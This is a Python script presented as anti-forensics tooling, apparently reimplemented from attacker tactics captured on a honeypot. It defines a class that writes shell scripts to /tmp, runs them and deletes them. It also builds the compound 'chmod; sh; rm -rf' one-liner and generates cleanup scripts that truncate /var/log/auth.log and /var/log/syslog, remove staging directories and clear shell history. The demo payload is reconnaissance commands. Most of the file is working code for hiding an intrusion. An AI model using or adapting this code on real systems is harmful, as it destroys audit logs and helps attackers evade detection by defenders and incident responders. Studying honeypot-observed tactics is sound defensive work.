#!/usr/bin/env python3
"""Anti-forensics: Self-deleting staged execution.
Extracted from real attacker TTP (130.12.180.51, Cowrie honeypot, 2026-02-08).
Writes payload to temp file, executes, then removes all traces.
"""
import subprocess
import os
import sys
import tempfile
import stat

class SelfDeletingExecutor:
    """Execute payloads that delete themselves after running."""

    def __init__(self, cleanup_code: str = "", payload_code: str = ""):
        self.cleanup_code = cleanup_code
        self.payload_code = payload_code

    def _write_script(self, name: str, content: str, directory: str = "/tmp") -> str:
        path = os.path.join(directory, name)
        with open(path, "w") as f:
            f.write("#!/bin/sh\n")
            f.write(content + "\n")
        os.chmod(path, stat.S_IRWXU)
        return path

    def execute_staged(self, workdir: str = "/tmp") -> dict:
        """Two-stage execution: cleanup first, then payload, both self-delete."""
        results = {"stages": [], "success": False}

        # Stage 1: Cleanup (remove prior artifacts)
        if self.cleanup_code:
            path = self._write_script("clean.sh", self.cleanup_code, workdir)
            r = subprocess.run(["sh", path], capture_output=True, timeout=30)
            os.unlink(path)
            results["stages"].append({
                "name": "cleanup",
                "rc": r.returncode,
                "deleted": not os.path.exists(path)
            })

        # Stage 2: Payload
        if self.payload_code:
            path = self._write_script("setup.sh", self.payload_code, workdir)
            r = subprocess.run(["sh", path], capture_output=True, timeout=30)
            os.unlink(path)
            results["stages"].append({
                "name": "payload",
                "rc": r.returncode,
                "deleted": not os.path.exists(path)
            })

        results["success"] = all(
            s.get("deleted", False) and s["rc"] == 0
            for s in results["stages"]
        )
        return results

    def generate_oneliner(self) -> str:
        """Generate compound command as seen in the wild."""
        parts = []
        if self.cleanup_code:
            parts.extend([
                "chmod +x clean.sh",
                "sh clean.sh",
                "rm -rf clean.sh"
            ])
        if self.payload_code:
            parts.extend([
                "chmod +x setup.sh",
                "sh setup.sh",
                "rm -rf setup.sh"
            ])
        return "; ".join(parts)

    @staticmethod
    def generate_cleanup_script(paths_to_remove: list, logs_to_truncate: list = None) -> str:
        """Generate cleanup shell script content."""
        lines = []
        for p in paths_to_remove:
            lines.append(f"rm -rf {p}")
        if logs_to_truncate:
            for log in logs_to_truncate:
                lines.append(f"truncate -s 0 {log} 2>/dev/null")
        lines.append("history -c 2>/dev/null")
        return "\n".join(lines)


if __name__ == "__main__":
    cleanup = SelfDeletingExecutor.generate_cleanup_script(
        ["/tmp/.cache", "/var/tmp/.X11-unix"],
        ["/var/log/auth.log", "/var/log/syslog"]
    )
    exe = SelfDeletingExecutor(
        cleanup_code=cleanup,
        payload_code="whoami; id; uname -a"
    )
    print("One-liner:", exe.generate_oneliner())

